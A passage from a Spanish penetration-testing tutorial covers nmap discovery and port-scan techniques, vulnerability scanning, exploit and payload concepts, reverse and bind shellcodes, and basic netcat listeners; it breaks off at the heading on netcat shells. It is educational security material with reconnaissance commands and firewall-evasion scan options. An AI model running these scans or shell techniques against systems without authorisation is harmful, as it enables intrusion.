Además, nmap soporta el uso de dos protocolos para realizar las tareas de escaneo y descubrimiento, el protocolo ARP y el protocolo ICMP.

Para indicar que nmap realice un escaneo de red haciendo uso del protocolo ARP se ha de utilizar el operador **-PR**.

```bash
nmap -PR 192.168.0
```

Por otro lado, también es posible realizar un escaneo utilizando el protocolo ICMP con el operador **-sP** de nmap.  

```bash
nmap -sP 192.168.0.*
```

- **Reconocer el Sistema Operativo objetivo mediante el TTL** 

El campo TTL (Time To Live) en la cabecera de un paquete IP indica la cantidad máxima de saltos (routers) que un paquete puede realizar antes de ser descartado. El valor TTL es establecido por el sistema operativo de origen y, por lo general, tiene valores predeterminados diferentes para sistemas Linux, Windows, y otros. Al analizar el TTL de los paquetes recibidos, es posible deducir el sistema operativo del origen sin necesidad de interactuar directamente con él.

```bash
ping -c 1 IP-Objetivo
```

- **Linux/Unix:** 64
- **Windows:** 128
- **MacOS:** 64
- **Solaris/AIX:** 254
- **FreeBSD:** 64

- **Escaneo de servicios:** Esta otra tipología de escaneo, tiene como objetivo obtener información sobre los servicios específicos, versiones y tecnología de los mismos que se encuentran habilitados en cada activo que se encuentre dentro del alcance de las pruebas.

Una vez tenemos recopiladas las direcciones IP de los host que se encuentran en el alcance de las pruebas, el siguiente paso es poder comprobar los servicios que se encuentra prestando cada equipo, el puerto TCP o UDP en el que se encuentra activo cada servicio así como la versión de los mismos.  

Como veremos más adelante, existen distintas técnicas para realizar enumeración de puertos TCP, esto es debido a que pueden existir protecciones de seguridad en la red, como firewalls, que limiten el acceso a los servicios según el origen de las peticiones.  
  
La herramienta principal para realizar la enumeración de puertos y servicios es nmap, aunque también se puede utilizar su versión gráfica Zenmap o incluso nc. Aunque nc no ofrece la versatilidad y la potencia de nmap hay que conocer su uso dado que en ocasiones puede suceder que hayamos accedido a un sistema en la organización que no disponga de nmap y deseamos realizar un escaneo de puertos a otras redes a las que no tenemos acceso.  

A continuación, se introducen varias herramientas de escaneo de servicios así como su uso básico y que tipo de información son capaces de obtener.

- **nc (netcat)**

También conocido como netcat, nc es una herramienta de red que permite, a través de intérprete de comandos y con una sintaxis sencilla, abrir puertos TCP/UDP en un HOST (quedando netcat a la escucha), asociar una shell a un puerto en concreto (para conectarse por ejemplo a MS-DOS o al intérprete bash de Linux remotamente) y forzar conexiones UDP/TCP (útil por ejemplo para realizar rastreos de puertos o realizar transferencias de archivos bit a bit entre dos equipos). Posteriormente fue portada a Windows y Mac OS X entre otras plataformas.  

Para poder realizar la conexión simplemente habrá que indicar la dirección IP y el puerto al que se ha de conectar.

```bash
nc dirección_ip puerto
```  

Una vez realizada la conexión, si queremos que el servidor devuelva el banner del servicio habrá que transmitir datos con la conexión establecida.  

En caso de no especificar ninguna opción la comunicación se establecerá mediante el protocolo de transporte TCP. En caso de querer realizar la comunicación sobre un puerto UDP, habrá que especificar el operador **-u**.  

```bash
nc -u dirección_ip puerto
```

También se puede indicar un rango de puertos sobre los que realizar la conexión y nc intentará la conexión a cada puerto mostrando los puertos que se encuentran accesibles.  

```bash
nc -zv dirección_ip pto_inicial – pto_final
```

- **nmap** 

En este caso se introducirá su uso para el escaneo de servicios. El objetivo es localizar los puertos que se encuentren abiertos en el sistema remoto, ya sea mediante el protocolo TCP o el protocolo UDP, y averiguar el servicio que se encuentra publicado en cada puerto, el software utilizado para proporcionar dicho servicio y su versión.  

Para realizar esta tarea se consulta a cada puerto (TCP o UDP) de un determinado rango para comprobar si el puerto se encuentra cerrado, o por el contrario está abierto y con un determinado servicio publicado.  

Dado que en la red auditada pueden existir protecciones a nivel de red (como los firewalls) que protegen dichos servicios, se pueden utilizar varias técnicas de escaneo distintas que localizan si un puerto se encuentra abierto. Por ejemplo, en el protocolo TCP se puede abusar del mecanismo “three way handshake” necesario para establecer la comunicación.  

```bash
nmap -Pn [IP/rango] –p [puerto/rango] -sT
```

Además de averiguar si un puerto determinado se encuentra abierto en el sistema remoto, también es necesario conocer el servicio concreto que se encuentra activo en ese puerto, así como el software utilizado y la versión del mismo (Por ejemplo Microsoft IIS como servidor web). De esta manera podremos tener una visión más exhaustiva de los servicios que operan en cada sistema remoto y hacernos una idea de la función de dicho equipo en la infraestructura. Por otro lado, conocer el tipo y versión del software nos ayuda a localizar vulnerabilidades en el sistema remoto que se produzcan en la versión concreta del software utilizado.  

Para poder localizar el tipo y versión del software de un determinado servicio se utiliza la técnica de “banner grabbing”. Esta técnica se basa en observar la información devuelta por cada aplicación remota al establecer una comunicación activa. La mayoría de servicios en su configuración predeterminada muestran, como mínimo, el tipo y la versión del software en ejecución. Para poder ejecutar esta técnica a través de la herramienta nmap se ha de realizar un escaneo TCP (Full scan o Stealth scan) o UDP y añadir el operador **-sV** (Service Version) para que nmap solicite el banner del servicio, lo compruebe en su base de datos y nos diga el software utilizado y su versión exacta (en ocasiones versión aproximada)  

El comando de nmap utilizado para realizar la técnica es el siguiente:  

```bash
nmap [IP/rango] –p [puerto/rango] -sV
```

Por otro lado, nmap dispone de una serie de scripts para poder realizar otro tipo de consultas sobre el objetivo. Estos scripts se encuentran separados por categorías, existe una categoría llamada “version” que realiza ciertas tareas adicionales de descubrimiento, limitados a ciertos servicios.  

El comando de nmap utilizado para invocar todos los scripts englobados en la categoría versión es el siguiente:  

```bash
nmap [IP/rango] –p [puerto/rango] --script “version”
```

Otro operador alternativo a **–sV** y más completo, es el operador **-A**, que además de realizar un descubrimiento de las versiones del servicio, también realiza detección del Sistema Operativo realiza un traceroute a la máquina y lanza scripts de recopilación de información más específicos por cada puerto abierto.  

El comando de nmap utilizado para realizar la técnica es el siguiente:

```bash
nmap [IP/rango] –p [puerto/rango] -A
```

Dado que en la red auditada pueden existir protecciones a nivel de red (como los firewalls) que protejan dichos servicios, se pueden utilizar varias técnicas de escaneo distintas que localizan si un puerto se encuentra abierto. Por ejemplo, en el protocolo TCP se puede abusar del mecanismo “three way handshake” necesario para establecer la comunicación.  

A continuación, se enumeran las distintas técnicas disponibles para el escaneo de puertos utilizando la herramienta nmap.  

**TCP Connect (Full open scan)  
**Es la técnica de escaneo de puertos por defecto en nmap. Intenta realizar una conexión completa mediante el establecimiento del “three way handshake”. Dependiendo de la respuesta recibida por el puerto remoto determinamos si se encuentra abierto o cerrado:  

- **Se recibe SYN/ACK:** El puerto se encuentra abierto.
- **Se recibe RST:** El puerto se encuentra cerrado.

El comando de nmap utilizado para realizar la técnica es el siguiente:  

```bash
nmap –sT [IP/rango] –p [puerto/rango]
```

**Stealth scan (Half open scan)  
**Esta técnica intenta realizar una conexión TCP mediante el establecimiento del “three way handshake”, pero no llega a completarla, enviando un “reset” al puerto consultado en caso de que responda. La única ventaja con respecto a la técnica anterior es que al no completar el “three way handshake” el escaneo es más rápido. Dependiendo de la respuesta recibida por el puerto remoto determinamos si se encuentra abierto o cerrado:

- **Se recibe SYN/ACK:** El puerto se encuentra abierto.
- **Se recibe RST:** El puerto se encuentra cerrado.
- **Sin respuesta o error ICMP no alcanzable:** El puerto se encuentra filtrado.

El comando de nmap utilizado para realizar la técnica es el siguiente:

```bash
nmap –sS [IP/rango] –p [puerto/rango]
```

**FIN scan (Inverse TCP flag scan)  
**Esta técnica sólo envía un segmento TCP con el flag FIN. La ventaja principal de este tipo de escaneo es que es que puedes conocer si un determinado puerto se encuentra abierto aunque exista un firewall que esté protegiendo las conexiones contra el activo auditado. Dependiendo de la respuesta recibida por el puerto remoto determinamos si se encuentra abierto o cerrado:  

- **Se recibe RST:** El puerto se encuentra abierto.
- **Sin respuesta:** El puerto se encuentra cerrado.

El comando de nmap utilizado para realizar la técnica es el siguiente:

```bash
nmap –sF [IP/rango] –p [puerto/rango]
```

**XMAS scan (All TCP flag scan)**  
Esta técnica sólo envía un segmento TCP con los siguientes flags activos ACK, RST, SYN, URG y PSH. La ventaja principal de este tipo de escaneo es que es que puedes conocer si un determinado puerto se encuentra abierto aunque exista un firewall que esté protegiendo las conexiones contra el activo auditado.  

Por contrapartida, esta técnica sólo funciona en sistemas remotos UNIX. Dependiendo de la respuesta recibida por el puerto remoto determinamos si se encuentra abierto o cerrado:  

- **Se recibe RST:** El puerto se encuentra cerrado.
- **Sin respuesta:** El puerto se encuentra abierto.

El comando de nmap utilizado para realizar la técnica es el siguiente:

```bash
nmap –sX [IP/rango] –p [puerto/rango]
```

**NULL scan (null TCP flag scan)**  
Esta técnica envía un segmento TCP sin ningún flag activado. La ventaja principal de este tipo de escaneo es que es que puedes conocer si un determinado puerto se encuentra abierto aunque exista un firewall que esté protegiendo las conexiones contra el activo auditado. Dependiendo de la respuesta recibida por el puerto remoto determinamos si se encuentra abierto o cerrado:  

- **Se recibe RST:** El puerto se encuentra abierto.
- **Sin respuesta:** El puerto se encuentra cerrado.

El comando de nmap utilizado para realizar la técnica es el siguiente:

```bash
nmap –sN [IP/rango] –p [puerto/rango]
```

**UDP scan**  
Esta técnica se utiliza para comprobar si un determinado puerto UDP se encuentra abierto en el sistema remoto. Para ello, se envía un datagrama UDP. Dado que el protocolo UDP no está orientado a la conexión lo normal es que si un puerto se encuentra abierto no envíe ningún tipo de respuesta al origen de la consulta. Dependiendo de la respuesta recibida por el puerto remoto determinamos si se encuentra abierto o cerrado.  

- **Se recibe Error ICMP no alcanzable (tipo 3 código 3):** El puerto se encuentra cerrado.
- **Se recibe Error ICMP (tipo 3 código 1, 2, 9, 10 o 13):** El puerto se encuentra filtrado.
- **Sin respuesta:** El puerto se encuentra abierto o filtrado.

El comando de nmap utilizado para realizar la técnica es el siguiente:

```bash
nmap –sU [IP/rango] –p [puerto/rango]
```  

- **Escaneo de vulnerabilidades:** Una vez se han realizado los otros dos tipos de escaneos, y se tiene más información de sobre la infraestructura y los servicios que sustenta, se comprueba si existe algún tipo de vulnerabilidad en base al tipo de servicio y la versión del mismo. También se buscan posibles vulnerabilidades que pudieran estar presentes debido a defectos en el diseño o en la configuración aplicada.

Después de haber localizado los servicios expuestos en los sistemas remotos, el software y la versión exacta de los mismos, es posible hacer una búsqueda para localizar posibles vulnerabilidades que se encontrasen presentes en esas versiones concretas.  

Además del uso de otras técnicas y herramientas, se puede utilizar la herramienta nmap para realizar un escaneo de vulnerabilidades. Para realizar esta tarea, nmap se apoya en los scripts de la categoría "vuln" que disponga.

**Scripts de detección de vulnerabilidades**  
Existen ciertos scripts en nmap que buscan ciertas vulnerabilidades muy concretas de las versiones de algunos servicios. Dado que todos estos scripts se engloban bajo la categoría “vuln” podemos indicar a nmap que utilice todos los scripts que se encuentren catalogados en este grupo. Cabe destacar que el script comprueba las posibles vulnerabilidades existentes en base a la versión del software utilizado para ejecutar el servicio, de esta manera, siempre hay que forzar la enumeración de los servicios de nmap con el operador **-sV**. En caso contrario, el script no tendrá información del software utilizado en el servicio y no podrá mapear las posibles vulnerabilidades.

```bash
nmap 192.168.1.1 –sV --script vuln
```

**Proyecto vulscan**
Proyecto que utiliza nmap para realizar una búsqueda de posibles vulnerabilidades existentes en los sistemas basándonos en la versión de los servicios localizados en el sistema remoto. Se apoya en un script nse y una base de datos de vulnerabilidades locales para detectar los servicios vulnerables. Se puede acceder al proyecto vulscan desde su repositorio de github vulscan (https://github.com/scipag/vulscan). Al igual que en el caso anterior, el script comprueba las posibles vulnerabilidades existentes en base a la versión del software utilizado para ejecutar el servicio, de esta manera, siempre hay que forzar la enumeración de los servicios de nmap con el operador -sV. En caso contrario, el script no tendrá información del software utilizado en el servicio y no podrá mapear las posibles vulnerabilidades.  

Una vez instalado se invoca como un script de nmap  

```bash
nmap 192.168.1.1 –sV --script vulscan/vulscan.nse
```

**Enfoque de los escaneos**  
Atendiendo al enfoque utilizado para realizar estos escaneos, podemos distinguir dos grandes enfoques bien diferenciados. Uno en el que nos apoyamos en ciertas herramientas para facilitar la tarea de escaneo y otro en el que el auditor delega la práctica totalidad de la tarea de escaneo a herramientas automáticas.

- **Escaneo manual:** El auditor se apoya en ciertas herramientas que le facilitan la tarea de escaneo, puede utilizar herramientas específicas para cada tipo de escaneo, e incluso combinar varias para obtener resultados más precisos.
- **Escaneo automático:** El auditor delega las labores de escaneo a herramientas automáticas que serán las encargadas de adaptar sus pruebas al tipo de escaneo a realizar y a la infraestructura objetivo. Son muy utilizados en alcances muy extensos en los que prima tener una “foto rápida” de la infraestructura, pero se recomienda complementarlos con escaneos manuales para tener unos resultados más elaborados y acordes con la realidad.

**Opciones avanzadas de nmap**  
Además de las opciones anteriormente descritas de nmap existen otros muchos operadores especiales que nos permiten utilizar esta herramienta para personalizar los escaneos. A continuación se muestran las opciones más comúnmente utilizadas:  

**Especificar los objetivos del escaneo**  
nmap tiene varias opciones que nos permiten seleccionar el objetivo del escaneo. Por ejemplo, se puede indicar una notación CIDR para identificar la red objetivo del escaneo:  

```bash
nmap 192.168.1.0/24, 172.16.0.0/16
```

También se puede hacer uso de expresiones regulares:  

```bash
nmap 192.168.1.*, 172.16.*.*  
```

Incluso indicar un rango consecutivo de direccionamiento IP a utilizar:  

```bash
nmap 192.168.1.1-254, 172.16.1-10.1-254  
```

**Especificar los puertos a escanear**  
También es posible identificar el rango de puertos que queremos escanear en los sistemas remotos. Por ejemplo, se pueden escanear rangos de puertos consecutivos haciendo uso del operador **-p**:  

```bash
nmap 192.168.1.1 -p 1-1024  
```

Con el mismo operador **-p** también se pueden especificar varios puertos específicos, consecutivos o no:  

```bash
nmap 192.168.1.1 –p 80,443,135-139
```  

Por último también, se puede indicar que se realice un escaneo a los puertos más utilizados. Por ejemplo, el siguiente ejemplo realiza un escaneo sobre los 100 puertos más utilizados (según la BBDD de nmap):  
 
```bash
nmap 192.168.1.1 --top-ports 100  
```

**Especificar el formato de exportación de resultados**  
nmap dispone de varias formatos de exportación de los resultados obtenidos:  

```bash
nmap 192.168.1.1 -oN resultado_ –> Formato estándar  
nmap 192.168.1.1 -oG resultado_ –> Formato grep  
nmap 192.168.1.1 -oX resultado_ –> Formato XML  
nmap 192.168.1.1 -oA resultado_ –> Exportar todos los formatos  
```

**Especificar la velocidad del escaneo de puertos**  
Debido a que existen ciertos dispositivos de protección de red, como los IPS (Infraestructura Protection System), que detectan y bloquean intentos de escaneo, una opción interesante de la herramienta nmap es la de ajustar la velocidad del escaneo con el parámetro **-T**. Existen de **0** a **5** niveles de velocidad de escaneo, siendo **0** la más lenta y **5** la más rápida.  
 
```bash
nmap 192.168.1.0/16 -T5  
```

**Uso de scripts**  
El uso de scripts es una característica que incorpora nmap y permite realizar pruebas adicionales en los servicios localizados por nmap en el objetivo. Se puede invocar el uso de uno o varios scripts con el operador **--script** y el nombre del script o haciendo uso de expresiones regulares.  
 
```bash
nmap 192.168.15.205 --script "smb-enum-users.nse"  
nmap 192.168.15.205 --script "smb-*"  
```

Además, todos los scripts se encuentran agrupados en una o varias categorías (**auth, broadcast, brute, discovery, dos, exploit, fuzzer, intrusive, safe, versión, vuln**) y se pueden especificar el uso de una o varias categorías de scripts en el escaneo.

```bash
nmap 192.168.15.205 --script discovery
```  

E incluso utilizar expresiones regulares para indicar la inclusión de scripts de ciertas categorías en los escaneos siempre y cuando no pertenezcan también a otra categoría.  
  
```bash
nmap 192.168.15.205 --script (discovery) and not (intrusive or dos or fuzzer)
```

**Otras herramientas de búsqueda de vulnerabilidades**  
Aunque en las secciones anteriores hemos visto cómo se puede utilizar nmap a modo de escáner de vulnerabilidades, también existen otros métodos y herramientas adicionales para llevar a cabo este proceso.  
 
Por ejemplo, se puede utilizar un enfoque más manual en el que se buscan en las bases de datos de vulnerabilidades si existe alguna vulnerabilidad que afecte al software y a la versión concreta del servicio remoto.  

Otro enfoque normalmente utilizado es hacer uso de alguna de las herramientas de búsqueda automática de vulnerabilidades existentes. En este caso, existen herramientas que buscan vulnerabilidades en protocolos y/o frameworks concretos.  
 
En este apartado se enumeran algunas de las técnicas y herramientas más utilizadas.  
 
**Búsqueda de vulnerabilidades en portales**  
En internet se pueden consultar distintos portales especializados que recopilan información de vulnerabilidades conocidas. Dependiendo del portal consultado, obtendremos más o menos información a cerca de la vulnerabilidad, si existe algún tipo de prueba de concepto asociada, parches que mitigan la vulnerabilidad, riesgo de la misma, etc.  

- **Common Vulnerabilities and Exposures (CVE):** Portal del organismo Mitre que recopila todas las vulnerabilidades comunicadas y que son vulnerabilidades catalogadas como públicas. No incluye exploits ni pruebas de concepto a vulnerabilidades.(https://www.cvedetails.com/index.php)
- **vulners.** Portal parecido al anterior, pero en este caso de una organización privada, se recopilan vulnerabilidades conocidas pero no se ofrece el exploit ni la prueba de concepto que explota la vulnerabilidad. Se puede acceder de manera gratuita a la consulta de vulnerabilidades (https://vulners.com/search?query=order:published).
- **exploit-db:** Mantenida por otra organización privada, gestiona una base de datos con vulnerabilidades y sus correspondientes exploits, o pruebas de concepto, para aprovecharse de la vulnerabilidad en el sistema remoto. (https://www.exploit-db.com/)

**Escáner de protocolos y frameworks específicos**  
Existen ciertas herramientas que nos ayudan a localizar vulnerabilidades conocidas en ciertos protocolos o en frameworks muy específicos.  

- **testssl:** Herramienta utilizada para localizar vulnerabilidades conocidas en los protocolos SSL o TLS, la implementación de los mismos, vulnerabilidades relacionadas con el certificado utilizado o los algoritmos criptográficos utilizados.
- **CMSMap:** Escáner “open source” desarrollado en Python que localiza vulnerabilidades en los CMS (sistema de gestión de contenidos) más populares como son Wordpress, Joomla, Drupal y Moodle.
- **JoomScan:** Escáner “open source” desarrollado en perl y perteneciente al proyecto OWASP. Localiza vulnerabilidades de versión y defectos en la configuración de portales basados en el framework Joomla.
- **Wpscan:** Escáner “open source” desarrollado en Ruby. Localiza vulnerabilidades de versión y defectos en la configuración de portales basados en el framework WordPress.

# **Fase de Explotación**

La fase de explotación de vulnerabilidades se realiza después de realizar la fase de escaneo.  

Tras la identificación de vulnerabilidades en los servicios localizados en las fases anteriores, el siguiente paso es explotarlas con el objetivo de mostrar el riesgo real de la vulnerabilidad en base a la **confidencialidad, integridad y disponibilidad** de la información.  

La gran cantidad de servicios, aplicaciones y versiones existentes hace que exista un número de vulnerabilidades indeterminado, enorme y creciente, así como que aumente la posibilidad de la existencia de fallos de configuración, lo que supone tal cantidad de técnicas de explotación que resulta inabarcable.

Para ello se utilizarán herramientas específicas de explotación que se aprovecharán de ciertos vectores de ataque para realizar el compromiso inicial en un sistema remoto.  

El siguiente gráfico muestra la cadena de explotación en la que trabajaremos para conseguir el compromiso de un sistema remoto.

<div align="center">
  <img src="imagenes/Captura de pantalla de 2025-06-27 02-15-04.png" alt="" width="485">
</div>

En la página de [hacktricks](https://book.hacktricks.wiki/es/index.html) página muy recomendable con información sobre las distintas técnicas de explotación de los diferentes servicios.

**Vectores de ataque**  
Aunque el vector más común de ataque consiste en la explotación de una vulnerabilidad, no es el único vector que nos puede dar acceso a un equipo remoto. A continuación, realizamos una enumeración de los más importantes:

- **Explotación de una vulnerabilidad conocida:** Es el vector de ataque más común utilizado para la explotación. En este caso, los atacantes tras realizar una fase de enumeración y de escaneo completa, localizan la presencia de algún sistema que se encuentre afectado por una vulnerabilidad conocida. De esta manera se hace uso de un exploit específico, junto con un payload, para la vulnerabilidad concreta que nos permitiría ejecutar órdenes no autorizadas en el sistema remoto.
- **Ejecución de un programa malintencionado (Malware):** También conocido como malware consiste en generar un payload o shellcode en un formato ejecutable o camuflado dentro de un programa legítimo. Este programa se puede distribuir de distintas maneras a las víctimas, pero siempre está condicionado a un factor de ingeniería social para que la víctima ejecute el malware. Por ejemplo, esconder el payload en una macro de Excel y enviar un correo masivo a los empleados de una compañía engañándolos para que crean que en el Excel está la relación de subidas salariales.
- **Contraseñas por defecto o poco robustas:** Este es un vector de acceso muy común debido a que cierto software y dispositivos de red se despliegan con una contraseña por defecto establecida por el fabricante. Si esta contraseña no se modifica, puede ser utilizada por un atacante para ingresar en el sistema. Por otro lado, el establecimiento de contraseñas catalogadas como inseguras, o muy fáciles de adivinar, también entrarían dentro de esta categoría. Además, un atacante podría utilizar técnicas de fuerza bruta junto con un diccionario de posibles contraseñas para conseguir las credenciales de acceso.
- **Ejecución remota de comandos:** Esta vulnerabilidad puede encontrarse cuando se auditan aplicaciones web, móviles, APIS, etc. Y se descubre que abusando de una determinada funcionalidad legítima se puede llegar a ejecutar comandos en el servidor remoto.

**Concepto de Exploit**  
Un exploit es un software, pequeña aplicación o script que permite aprovecharse de un defecto de seguridad (Configuración incorrecta en el sistema, contraseñas débiles o por defecto) o explotar un fallo en el sistema (Fallo en el software, sistema o dispositivo afectado que pueda dar lugar a un problema de seguridad).  

La ejecución satisfactoria de un exploit puede generar una serie de riesgos de seguridad:  

- Denegación o degradación del servicio
- Corrupción de información
- Corrupción de la configuración del sistema o servicio
- Acceso no autorizado
- Escalada de privilegios

A modo general un exploit pueden catalogarse según los distintos grupos:

**Explotables de manera remota**  
La explotación se hace sobre un sistema remoto al que no se tiene acceso de manera previa.  

- **Explotables en el lado del servidor (Server-side):** Son aquellos exploits que tienen por objetivo comprometer un servicio que se ejecuta en modo servidor
- **Explotables en el lado del cliente (Client-side):** Los exploits de esta categoría afectan al software y programas que se ejecutan en el lado del cliente (programas ofimáticos, navegadores web, clientes de correo).

**Explotables de manera local**  
Necesitamos disponer de privilegios de acceso en el sistema afectado  

- **Exploits de escalada de privilegios:** Son exploits que se ejecutan de manera local con el objetivo de conseguir un mayor nivel de acceso en el sistema.

**Partes de un exploit**

Todo exploit consta de dos partes bien diferenciadas, las cuales detallamos a continuación:  

- **Exploit:** Es el código encargado de explotar la vulnerabilidad mediante la ejecución de instrucciones en la víctima afectada por la vulnerabilidad.
- **Payload:** Es el código o set de instrucciones que se ejecutan una vez explotada la vulnerabilidad y permite ejecutar código no autorizado en el cliente, como por ejemplo la ejecución de una shellcode.

**Búsqueda de exploits**  
Una vez completada la fase de escaneo de vulnerabilidades disponemos de una serie de posibles vulnerabilidades en los sistemas objetivo. En esta fase de explotación se ha de buscar si existe un exploit público, o en su defecto una Prueba de concepto, para la vulnerabilidad concreta que queremos explotar. Para ello se puede hacer uso de las siguientes herramientas.  

- **exploit-db:** Es una base de datos online de búsqueda de vulnerabilidades y exploits para poder comprometer un objetivo. La base de datos se encuentra disponible para su consulta en la siguiente dirección URL (https://www.exploit-db.com/).
- **Github:** Aunque GitHub se utiliza como repositorio de código fuente, normalmente también podemos localizar pruebas de concepto de vulnerabilidades, e incluso exploits totalmente funcionales.
- **searchsploit:** Es una herramienta disponible para sistemas Linux. Realiza búsquedas de exploits disponibles en una copia local de la Base de Datos mantenida por exploit-db. Además, también te indica dónde se encuentra la copia local del exploit para poder modificarlo y utilizarlo para comprometer el equipo remoto.
- **Metasploit:** Aunque desarrollaremos con más detenimiento el uso de la herramienta Metasploit en la siguiente entrada de este blog, cabe destacar que la herramienta Metasploit es una suite completa de Explotación y Postexplotación y contiene una gran cantidad de exploits para su consulta y uso.

**Concepto de payload**  
Un payload es la porción de código o instrucciones que se ejecuta inmediatamente después del exploit y que obliga a la víctima a realizar una serie de operaciones. Atendiendo a cómo se transmita este payload a la víctima podemos agrupar los payloads en dos categorías:

- **Non-staged:** Se denominan payloads autocontenidos, normalmente se corresponden con la ejecución de un comando muy específico en la víctima para añadir un usuario en el sistema remoto, añadir un usuario a un grupo privilegiado, establecer una conexión secundaria entre víctima y auditor.
- **Staged:** En este caso el payload se transmite en varias partes con la finalidad de evitar posibles bloqueos que pudieran realizarse debido a los dispositivos de seguridad existentes en la red. La primera parte que se inyecta en la víctima corresponde a una pequeña porción de código que es ejecutado y espera al envío de la segunda parte del payload. La segunda parte del payload se corresponde con un payload más avanzado como pudiera ser una shellcode avanzada, un servidor de VNC para controlar el sistema remoto, etc.

Se puede distinguir si un payload es _staged_ o _non-staged_ analizando el nombre. Por ejemplo, **windows/shell_reverse_tcp** tiene el propósito de abrir una shell reversa, al igual que el payload **windows/shell/reverse_tcp**. La diferencia es que el primero es autocontenido (_non-staged_), lo que se indica con el carácter "___" después de la palabra "_shell_", mientras que el segundo se compone de dos fases, lo que viene indicado por el caracter "_/_" despues de la palabra "_shell_".

Es muy comun el error de utilizar **netcat** como _handler_ para recibir la conexión y utilizar un payload _staged_, como puede ser **windows/shell/reverse_tcp** en lugar de **windows/shell_reverse_tcp**. En este caso, al explotar el sistema, **netcat** recibirá la conexión pero se cerrará inmediatamente. Esto puede llevar a pensar, erróneamente, que el _exploit_ no funciona correctamente, cuando lo que realmente está sucediendo es que sólo se ha inyectado el _stager_ y esta esperando a recibir el _stage_. Por tanto, para utilizar un _exploit_ y recibir la conexión en un listener de **netcat**, sera necesario seleccionar un _exploit non-staged_.

**Shellcode**  
Una shellcode es un tipo especial de payload que normalmente inicia una Shell de comandos, más o menos avanzada, a través de la cual el auditor puede controlar la máquina comprometida.  

**Tipos de shellcode**  
Las shellcodes son un tipo determinado de payload (Es decir, existen payloads que no son shellcodes). Dependiendo de la posición del auditor en el sistema objetivo podemos agruparlas en las siguientes categorías:  

- **Local:** Se utilizan cuando el auditor dispone de acceso a un equipo pero con un acceso limitado y utiliza una vulnerabilidad concreta para ejecutar una shellcode específica que le pudiera proporcionar una escalada de privilegios y obtener un mayor nivel de acceso en el sistema local.
- **Remota:** Este tipo de shellcode se utilizan cuando un atacante no dispone de acceso previo al equipo remoto y al ejecutarse la shellcode se establece un canal de comunicación remoto entre el auditor y la víctima.

Por otro lado, dependiendo de como se establece la conexión entre auditor y víctima podemos agruparlas en las siguientes categorías:

- **Bind:** Cuando este tipo de shellcodes son ejecutadas en la víctima se inicia un servidor de conexión abriendo un puerto en el equipo comprometido. En este tipo de shellcodes el atacante establece la conexión con el puerto que se ha levantado en la víctima. Sólo son funcionales si nos encontramos en la misma red local que la víctima y no existe ningún firewall que impida la comunicación con el puerto recién levantado en la víctima.
- **Reverse:** En este tipo de shellcodes no se inicia ningún servicio en la máquina víctima. Al contrario, es el auditor el que levanta un servidor a la escucha en un puerto determinado y el shellcode en la víctima inicia la conexión en el equipo del auditor y en el puerto apropiado. Dado que en este tipo de shellcode es la víctima quien inicia la conexión en caso de existir algún tipo de dispositivo firewall la conexión no se vería afectada.

<div align="center">
  <img src="imagenes/Captura de pantalla de 2025-06-27 02-45-25.png" alt="" width="485">
</div>

Una Shellcode puede categorizarse indicando una categoría de cada grupo. Por ejemplo Una shellcode inversa remota o una Shellcode local de tipo bind.  

Existen multitud de comandos y herramientas a traves de los cuales se puede obtener una shell de este tipo. la web **[revshells](https://www.revshells.com/)** recopila una enorme cantidad de comandos para lanzar sehlls revesas desde distintas aplicaciones: PHP, Perl, Java, Python, Ruby, Node.js y muchas mas. Dependiendo del entorno será necesario seleccionar la más adecuada.

También es recomendable revisar la página dedicada a las shells revesas de **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)**para explorar otros métodos y aplicar opciones avanzadas.

**Netcat**
Se trata de una de las herramientas básicas para el pentesting, es una aplicación muy ligera pero tremendamente versátil, por lo que es denominada en ocasiones la "navaja suiza de las herramientas de Hacking". Se desarrolló en 1996 para entornos **Unix**, aunque con posterioridad fue portada a **Windows** y **MacOS**.

El desarrollador liberó **netcat** bajo una licencia de software libre, de modo que se pueden encontrar otras versiones, aunque la versión original ya no está mantenida. Los desarrolladores de **nmap** han desarrollado una nueva versión de **netcat** denominada **ncat**, que tiene características actualizadas y utiliza prácticamente los mismos comandos, lo que la hace sencilla de utilizar y compatible, de modo que se puede establecer una conexión entre **netcat** y **ncat**. Existe otra versión, **netcat-openbsd**, que es muy limitada y que es la que se encuentra por defecto en los sistemas **Linux** modernos.

Netcat es, básicamente, una herramienta de red que permite recibir y escribir datos a través de sockets TCP y UDP y funciona tanto en modo cliente como en modo servidor. A pesar de su reducido tamaño tiene las siguientes funcionalidades:

- Abrir conexiones de red.
- Transferir archivos entre dos equipos.
- Realizar escaneos de puertos.
- Establecer shells en un equipo remoto.
- Redirigir conexiones.
- Abrir puertas traseras.
- En la versión **ncat**, permite cifrar la conexión.

**Netcat** pone a disposición del usuario una serie de parámetros para llevar a cabo las distintas acciones. Ncat aumenta el número de estos, por lo que resulta conveniente consultar el manual de la herramienta para profundizar en el conocimiento de la misma.

- **Abrir un puerto para recibir una conexión**

Durante un test de penetración existirán múltiples ocasiones donde resultará necesario recibir una conexión en el equipo propio o en algún equipo vulnerado. Dado que **netcat** también permite su utilización en modo servidor, se trata de una herramienta muy útil para este propósito.

Para entender el funcionamiento es necesario comenzar por la aplicación más básica de esta funcionalidad, que seria establecer una conexión que permita intercambiar mensajes de texto. Para ello es necesario disponer de dos equipos, uno actuará de servidor y ejecutará **netcat** para permitir conexiones entrantes, mientras que el otro actuará como cliente y utilizará **netcat** para establecer una conexión con el servidor.

Para este ejemplo se utilizan dos equipos con el sistema operativo **Linux**, uno con **netcat**tradicional instalado, que será el que actúe de servidor y el otro con **netcat-openbsd**:

**1º Apertura del listener en el servidor.**

En el equipo que actúe corno servidor se abre un puerto utilizando netcat. Para el éxito de la operación es necesario que no haya ningún firewall bloqueando el puerto.

```bash
nc -nlvp 8080
```

En el comando anterior se utilizan los siguientes parámetros, que se pueden especificar de manera individual o juntando todos usando un solo guion y sin espacios entre ellos:

- **-n:** para que no se realicen búsquedas DNS, su uso no es imprescindible.
- **-l:** indica que se abra un listener.
- **-v:** modo verbose para que muestre más información, tampoco es necesario.
- **-p:** para indicar el puerto en el que escuchará el listener.

**2º. Establecimiento de la conexión**

La conexión se iniciará desde el cliente, tal y como se indicó en el punto anterior, para lo que será necesario indicar la dirección IP del servidor y el puerto utilizado al abrir el listener, en este caso el 8080.

```bash
nc -nv 10.10.10.4 8080
```

Una vez establecida la conexión se muestra un mensaje en el servidor, tras lo que se puede intercambiar mensajes entre ambos equipos.

- **Apertura de shells con netcat**

